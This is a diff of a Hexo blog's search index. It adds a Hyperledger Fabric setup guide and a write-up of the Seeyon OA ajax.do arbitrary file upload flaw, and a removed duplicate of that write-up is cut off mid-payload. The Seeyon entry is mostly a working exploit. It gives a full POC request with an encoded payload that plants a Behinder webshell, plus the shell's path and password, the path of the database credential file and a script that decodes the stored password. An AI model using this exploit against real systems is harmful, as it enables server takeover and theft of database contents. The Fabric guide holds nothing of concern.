+<h3 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h3><ul>
+<li><code>/var/log/*</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>区块链 fabric搭建</title>
+    <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA.html</url>
+    <content><![CDATA[<p>记录Ubuntu22.04下搭建fabric平台</p>
+<span id="more"></span>
+
+
+
+<h2 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h2><h3 id="安装docker及docker-compose"><a href="#安装docker及docker-compose" class="headerlink" title="安装docker及docker-compose"></a>安装docker及docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装Docker</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker.io</span><br><span class="line"></span><br><span class="line"># 安装Docker Compose</span><br><span class="line">sudo apt-get install docker-compose</span><br></pre></td></tr></table></figure>
+
+<p>查看version检查是否安装成功</p>
+<img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240527220801577.png" alt="image-20240527220801577" style="zoom:150%;">
+
+<p>然后将用户添加到docker的用户组</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo usermod -a -G docker rev1ve</span><br></pre></td></tr></table></figure>
+
+<p>由于docker拉取镜像较慢，使用阿里云的加速器 <a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">官网链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
+
+<p>添加下面内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://nxmpk3z3.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重启服务即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="安装Go语言"><a href="#安装Go语言" class="headerlink" title="安装Go语言"></a>安装Go语言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install golang-go</span><br></pre></td></tr></table></figure>
+
+<p>查看version检查是否安装成功</p>
+<h3 id="安装Node-js和npm"><a href="#安装Node-js和npm" class="headerlink" title="安装Node.js和npm"></a>安装Node.js和npm</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装curl"><a href="#安装curl" class="headerlink" title="安装curl"></a>安装curl</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Fabric搭建"><a href="#Fabric搭建" class="headerlink" title="Fabric搭建"></a>Fabric搭建</h2><p>接下来均以root用户权限进行操作</p>
+<p>手动拉取镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/malingzhao/fabric-samples.git</span><br></pre></td></tr></table></figure>
+
+<p>拉取成功</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240529231237094.png" alt="image-20240529231237094"></p>
+<p>然后就是下载俩fabric文件</p>
+<p>注意对应的下载的fabric版本（前面sh搭建脚本有给）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#fabric</span><br><span class="line">https://github.com/hyperledger/fabric/releases/download/v2.5.8/hyperledger-fabric-linux-amd64-2.5.8.tar.gz</span><br><span class="line">#fabric-ca</span><br><span class="line">https://github.com/hyperledger/fabric-ca/releases/download/v1.5.11/hyperledger-fabric-ca-linux-amd64-1.5.11.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>然后在所在目录解压</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xzvf hyperledger-fabric-linux-amd64-2.5.8.tar.gz -C ./qu-kuai-lian/Fabric/fabric-samples/</span><br><span class="line">tar -xzvf hyperledger-fabric-ca-linux-amd64-1.5.11.tar.gz -C ./qu-kuai-lian/Fabric/fabric-samples/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240529224850595.png" alt="image-20240529224850595"></p>
+<p>检查一下<code>config</code>和<code>bin</code>在不在</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240529231331064.png" alt="image-20240529231331064"></p>
+<h2 id="设置go代理"><a href="#设置go代理" class="headerlink" title="设置go代理"></a>设置go代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>
+
+<p>测试一下，使用自带的<code>test-network</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./network.sh up</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240529225517680.png" alt="image-20240529225517680"></p>
+<p>没问题的话使用<code>./network.sh down</code>关闭即可</p>
+<h2 id="启动Fabric"><a href="#启动Fabric" class="headerlink" title="启动Fabric"></a>启动Fabric</h2><p>启动一下fabric</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd fabcar</span><br><span class="line">./startFabric.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd fabcar/go</span><br><span class="line">go build -mod=mod #构建Go程序并且导入依赖包</span><br><span class="line">go run fabcar.go</span><br></pre></td></tr></table></figure>
+
+<p>测试成功</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240529233205539.png" alt="image-20240529233205539"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzk0ODcwNTk4Mw==&mid=2247483706&idx=1&sn=c45a5c625966451859477307002ff859&chksm=c362ceeaf41547fce0a9e9008b1cbb095de2f19aa26856516150aefe969dcb16b28d35940bdc&mpshare=1&scene=23&srcid=0529j1qA3JxQ5rtvRugYrNq9&sharer_shareinfo=ee79a1ea9ef63d9bc3802817b585ee12&sharer_shareinfo_first=ee79a1ea9ef63d9bc3802817b585ee12#rd">https://mp.weixin.qq.com/s?__biz=Mzk0ODcwNTk4Mw==&amp;mid=2247483706&amp;idx=1&amp;sn=c45a5c625966451859477307002ff859&amp;chksm=c362ceeaf41547fce0a9e9008b1cbb095de2f19aa26856516150aefe969dcb16b28d35940bdc&amp;mpshare=1&amp;scene=23&amp;srcid=0529j1qA3JxQ5rtvRugYrNq9&amp;sharer_shareinfo=ee79a1ea9ef63d9bc3802817b585ee12&amp;sharer_shareinfo_first=ee79a1ea9ef63d9bc3802817b585ee12#rd</a></p>
+]]></content>
+      <categories>
+        <category>区块链</category>
+      </categories>
+      <tags>
+        <tag>环境搭建</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>博客常用设置</title>
     <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
     <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
@@ -2799,6 +3139,53 @@
       <tags>
         <tag>比赛</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>致远OA-ajax.do任意文件上传漏洞</title>
+    <url>/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>利用此漏洞来连接冰蝎，可用来命令执行或者数据库连接</p>
+<span id="more"></span>
+
+<h1 id="致远OA-ajax-do任意文件上传漏洞"><a href="#致远OA-ajax-do任意文件上传漏洞" class="headerlink" title="致远OA-ajax.do任意文件上传漏洞"></a>致远OA-ajax.do任意文件上传漏洞</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote>
+<p>致远OA旧版本中某些接口存在未授权访问，以及部分函数过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本，从而控制服务器</p>
+</blockquote>
+<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">致远OA V8.0</span><br><span class="line">致远OA V7.1、V7.1SP1</span><br><span class="line">致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">致远OA V6.0、V6.1SP1、V6.1SP2</span><br><span class="line">致远OA V5.x</span><br><span class="line">致远OA G6</span><br></pre></td></tr></table></figure>
+
+<h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>首先验证漏洞是否存在，访问如下url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br></pre></td></tr></table></figure>
+
+<p>如果出现异常页面，则漏洞可能存在</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214529204.png"></p>
+<p>POC如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>
+
+<p>如果漏洞利用成功，回显如下界面</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214707896.png"></p>
+<p>利用失败的话回显如下，或者页面空白，警告等</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214945750.png"></p>
+<p><strong>利用成功后用冰蝎连接</strong> <a href="https://github.com/rebeyond/Behinder/releases">工具链接</a></p>
+<p>webshell路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/SeeyonUpdate1.jspx</span><br></pre></td></tr></table></figure>
+
+<p>连接密码：rebeyond</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412215119512.png"></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>连接上马后即可命令执行，同样我们可以进行数据库连接从而实现敏感信息泄露</p>
+<p>当然前提是知道连接数据库的密码 <a href="https://www.cmdhack.com/archives/212.html">参考文章</a></p>
+<p>致远OA数据库配置文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/Seeyon/A8/base/conf/datasourceCtp.properties</span><br></pre></td></tr></table></figure>
+
+<p>访问可以找到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.backup.path=</span><br><span class="line">db.hibernateDialect=org.hibernate.dialect.SQLServerDialect</span><br><span class="line">ctpDataSource.username=sa</span><br><span class="line">workflow.dialect=SQLServer</span><br><span class="line">ctpDataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver</span><br><span class="line">ctpDataSource.password=/1.0/UWJ0dHgxc2U=</span><br><span class="line">ctpDataSource.url=jdbc:sqlserver://127.0.0.1:1433;DatabaseName=seeyou2;maxStatements=0;SelectMethod=cursor</span><br><span class="line">mysql.path=</span><br><span class="line">ctpDataSource.maxCount=2000</span><br></pre></td></tr></table></figure>
+
+<p>不过这里的密码是经过加密的，<code>1.0</code>表示左偏移一位，对应解密成明文</p>
+<p>解密脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a=&quot;&quot;</span><br><span class="line">password = &quot;Ab123456&quot;</span><br><span class="line">for i in password:</span><br><span class="line">    a+= chr(ord(i) -1 )</span><br><span class="line"></span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
+
+<p>得到密码后即可连接数据库造成敏感信息泄露</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>记录kali如何挂梯子</title>
@@ -2992,52 +3379,5 @@
       <tags>
         <tag>NSSCTF</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>致远OA-ajax.do任意文件上传漏洞</title>
-    <url>/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
-    <content><![CDATA[<p>利用此漏洞来连接冰蝎，可用来命令执行或者数据库连接</p>
-<span id="more"></span>
-
-<h1 id="致远OA-ajax-do任意文件上传漏洞"><a href="#致远OA-ajax-do任意文件上传漏洞" class="headerlink" title="致远OA-ajax.do任意文件上传漏洞"></a>致远OA-ajax.do任意文件上传漏洞</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote>
-<p>致远OA旧版本中某些接口存在未授权访问，以及部分函数过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本，从而控制服务器</p>
-</blockquote>
-<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">致远OA V8.0</span><br><span class="line">致远OA V7.1、V7.1SP1</span><br><span class="line">致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">致远OA V6.0、V6.1SP1、V6.1SP2</span><br><span class="line">致远OA V5.x</span><br><span class="line">致远OA G6</span><br></pre></td></tr></table></figure>
-
-<h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>首先验证漏洞是否存在，访问如下url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br></pre></td></tr></table></figure>
-
-<p>如果出现异常页面，则漏洞可能存在</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214529204.png"></p>
-<p>POC如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2